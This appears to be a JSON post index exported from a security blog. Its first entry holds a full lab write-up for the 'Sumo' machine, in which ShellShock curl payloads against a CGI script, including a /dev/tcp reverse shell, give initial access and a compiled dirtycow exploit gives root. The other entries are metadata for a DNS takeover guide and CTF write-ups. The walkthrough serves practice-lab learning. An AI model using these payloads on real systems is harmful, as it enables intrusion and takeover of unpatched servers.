[{"flags":[],"created":"2023-07-20T04:07:53.501Z","updated":"2023-07-20T04:07:53.501Z","slug":"/blog/2023/pgrounds/sumo-easy-writeup/+page.md","path":"/blog/2023/pgrounds/sumo-easy-writeup","toc":[{"depth":2,"title":"Introduction","slug":"introduction"},{"depth":2,"title":"Recon","slug":"recon"},{"depth":2,"title":"Exploitation","slug":"exploitation"},{"depth":3,"title":"Initial Access","slug":"initial-access"},{"depth":3,"title":"Privilege Escalation","slug":"privilege-escalation"}],"type":"note","html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>Sumo is a machine available on vulnhub and offsec proving grounds labeled <strong>easy</strong> and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted. </p><h2 id=\"recon\"><a href=\"#recon\">Recon</a></h2><p>After getting the IP of the machine, ran a basic nmap scan on the target machine: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nmap -Pn -sV -T4 192.168.1.48</div></code></div></pre><!-- HTML_TAG_END --><p>The disovered open ports are <code>80</code> and <code>22</code>. Lets visit the website first. </p><p>Next thing, i brute forced into the website using <code>dirsearch</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 dirsearch --url https://192.168.1.120</div></code></div></pre><!-- HTML_TAG_END --><p>I found the <code>CGI-BIN</code> endpoint. And from the nmap output, we know the version of apache is <code>2.2.22</code> which is quite an old version.</p><h2 id=\"exploitation\"><a href=\"#exploitation\">Exploitation</a></h2><h3 id=\"initial-access\"><a href=\"#initial-access\">Initial Access</a></h3><p>Now, duringthe brute force phase, i also discovered the <code>test</code> script under the <code>CGI-BIN</code> folder. Since, we know the system is old, lets try the famous <code>ShellShock</code> exploit: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>curl -H ‘User-Agent: () &#123; :; &#125;; whoami; pwd; pwd’ http://192.168.124.87/cgi-bin/test.sh</div></code></div></pre><!-- HTML_TAG_END --><p>And we got the output back. Lets escalate it to a shell: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>## Listening</div><div class='line'>nc -lvnp 555</div><div class='line'></div><div class='line'>## Target execution</div><div class='line'>curl -H ‘User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;& /dev/tcp/&lt;IP&gt;/555 0&gt;&1’ http://192.168.XX.XX/cgi-bin/test.sh</div></code></div></pre><!-- HTML_TAG_END --><p>And we got the shell. Our first flag is in <code>local.txt</code> file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>cat ./local.txt</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"privilege-escalation\"><a href=\"#privilege-escalation\">Privilege Escalation</a></h3><p>Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>hostnamectl  ## Game me no output</div><div class='line'>uname -a</div></code></div></pre><!-- HTML_TAG_END --><p>Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was <code>dirtycow</code>. Lets get a public version of it. Compiling it: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>gcc dirtycow.c -o dcow -pthread -static</div></code></div></pre><!-- HTML_TAG_END --><p>I used the <code>-static</code> flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on <code>Kali 2023.1</code>. Lets execute the binary: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>chmod +x ./dcow</div><div class='line'>./dcow</div></code></div></pre><!-- HTML_TAG_END -->"},{"title":"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover","tags":["dns-zone-takeover","dns-zone-transfer","subdomain-takeover","bugbounty","infosec","reconnaissance","automated-tool"],"categories":["Bug Bounty","Projects"],"summary":"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.","created":"2023-06-30T00:00:00.000Z","lastmod":"2023-06-30T00:00:00.000Z","image":"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127","flags":[],"updated":"2023-07-20T04:07:53.501Z","slug":"/blog/2023/subrake-a-dns-automated-scanner/+page.md","path":"/blog/2023/subrake-a-dns-automated-scanner","toc":[{"depth":2,"title":"Introduction","slug":"introduction"},{"depth":2,"title":"Subrake","slug":"subrake"},{"depth":2,"title":"Explanation","slug":"explanation"},{"depth":3,"title":"Zone Transfer","slug":"zone-transfer"},{"depth":3,"title":"Subdomain Takeover","slug":"subdomain-takeover"},{"depth":3,"title":"DNS Zone Takeover","slug":"dns-zone-takeover"},{"depth":4,"title":"Finding Zone Takeover","slug":"finding-zone-takeover"},{"depth":2,"title":"Using Subrake","slug":"using-subrake"},{"depth":2,"title":"Conclusion","slug":"conclusion"}],"type":"article","html":""},{"title":"BSidesTLV CTF 2023 Browselicious (Misc) Writeup","tags":["ctf","writeups","bsidestlv-ctf-2023"],"categories":["CTF Writeups"],"summary":"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023","created":"2023-06-28T00:00:00.000Z","lastmod":"2023-06-28T00:00:00.000Z","image":"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d","flags":[],"updated":"2023-07-20T04:07:53.501Z","slug":"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf/+page.md","path":"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","toc":[{"depth":1,"title":"Introducton","slug":"introducton"},{"depth":1,"title":"Writeup","slug":"writeup"},{"depth":3,"title":"Server Request","slug":"server-request"},{"depth":3,"title":"Code Review","slug":"code-review"},{"depth":3,"title":"Exploit","slug":"exploit"},{"depth":4,"title":"Input Field","slug":"input-field"},{"depth":4,"title":"Race Condition","slug":"race-condition"},{"depth":4,"title":"Post Message","slug":"post-message"},{"depth":2,"title":"PoC","slug":"poc"}],"type":"article","html":""},{"title":"Google CTF 2023 Under Construction (Web) Writeup","tags":["ctf","writeups","google-ctf-2023"],"categories":["CTF Writeups"],"summary":"Writeup for under construction challenge from google ctf 2023","created":"2023-06-27T00:00:00.000Z","lastmod":"2023-06-27T00:00:00.000Z","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","flags":[],"updated":"2023-07-20T04:07:53.501Z","slug":"/blog/2023/writeup-under-construction-google-ctf-2023/+page.md","path":"/blog/2023/writeup-under-construction-google-ctf-2023","toc":[{"depth":1,"title":"Introduction","slug":"introduction"},{"depth":1,"title":"Writeup","slug":"writeup"},{"depth":2,"title":"Getting Started","slug":"getting-started"},{"depth":2,"title":"Vulnerable Part","slug":"vulnerable-part"},{"depth":2,"title":"Exploit","slug":"exploit"}],"type":"article","html":""},{"title":"Privacy Policy","created":"2023-06-27T00:00:00.000Z","flags":["unlisted"],"updated":"2023-07-20T04:07:53.501Z","slug":"/privacy/+page.svelte.md","path":"/privacy","toc":false,"type":"article","html":""},{"title":"Resume","created":"2022-05-06T00:00:00.000Z","flags":["unlisted"],"updated":"2023-07-20T04:07:53.501Z","slug":"/resume/+page.svelte.md","path":"/resume","toc":[{"depth":2,"title":"Skills","slug":"skills"},{"depth":2,"title":"Experience","slug":"experience"},{"depth":2,"title":"Education","slug":"education"},{"depth":2,"title":"Certifications","slug":"certifications"},{"depth":2,"title":"Acheivements","slug":"acheivements"},{"depth":2,"title":"Projects","slug":"projects"},{"depth":2,"title":"Volunteering and Startups","slug":"volunteering-and-startups"},{"depth":2,"title":"Contact","slug":"contact"}],"type":"article","html":""}]